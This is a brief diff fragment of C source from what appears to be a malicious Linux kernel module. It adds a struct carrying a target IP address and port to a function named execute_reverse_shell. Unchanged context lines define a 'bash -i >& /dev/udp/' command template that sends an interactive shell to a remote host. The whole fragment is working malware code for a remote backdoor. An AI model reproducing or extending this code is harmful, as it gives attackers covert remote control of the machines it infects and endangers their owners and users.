@@ -5,6 +5,12 @@
 #define EXEC_P1 "bash -i >& /dev/udp/"
 #define EXEC_P2 "0>&1"
 
+struct shell_params {
+	struct work_struct work;
+	char* target_ip;
+	char* target_port;
+};
+
 void execute_reverse_shell(struct work_struct *work){
     int err;
     struct shell_params *params = (struct shell_params*)work;
